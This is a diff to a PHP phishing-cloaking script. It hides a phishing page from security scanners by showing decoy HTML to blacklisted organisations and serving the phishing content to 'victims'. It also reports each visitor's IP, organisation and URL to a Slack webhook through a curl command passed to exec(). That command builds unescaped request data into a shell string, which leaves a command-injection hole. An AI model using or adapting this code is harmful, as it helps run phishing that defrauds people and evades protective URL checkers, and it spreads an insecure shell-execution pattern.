@@ -3,8 +3,8 @@
 //AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
 // "false" means everyone is allowed except if they're on the blacklist
 $AutoBlock = false;
-// Your public IP (your client)
-$myip = "YOUR_IP_ADDRESS";
+// Your public IP (your client)        ************** MAKE SURE YOU SET THIS ****************
+$myip = "YOUR_IP_HERE";
 
 // Gets URI that's accessed
 $url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
@@ -50,8 +50,10 @@ array_push($blockorgs, $txt);
 //Block via blacklist
 if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true OR $org == "") {
 
-// Content for Orgs to see on the Blacklist (What everyone else sees)
-echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
+// Content for Orgs to see on the Blacklist
+// Point this to file containing HTML you want the blacklisters to see
+$fakehtml = file_get_contents('/var/www/html/fakecontent.html');
+echo $fakehtml;
 
 // Respond With 404 Instead of Image. More Likely to Fool URL Checkers
 //header('HTTP/1.0 404 not found'); 
@@ -60,25 +62,10 @@ $allowed = "- *Jedi Mind Trick Successful* -";
 
 } else {
 
-
-
-
-
-// PUT YOUR PHISHING CONTENT WITHIN THESE ELSE BRACKETS!!!!
-?>
-
-<HTML><BODY>Log in here!</BODY></HTML>
-
-
-
-
-
-
-
-
-<?php
-
-
+// Content for victims to see (not on the blacklist)
+// Point this to file containing HTML you want the victims to see
+$realhtml = file_get_contents('/var/www/html/realcontent.php');
+echo $realhtml;
 
 $allowed = "- *Allowed* -";
 }
@@ -96,8 +83,8 @@ $id = "";
 $message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
 }
 
-// Set Slack Information Here
-$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#general", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/SLACK_TOKEN_HERE';
+// Set Slack Information Here       ************** MAKE SURE YOU SET THIS ****************
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#general", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/YOUR_SLACK_API_KEY_HERE';
 //echo $cmd;
 exec($cmd);
 
@@ -116,3 +103,20 @@ exec($cmd);
 
 
 ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
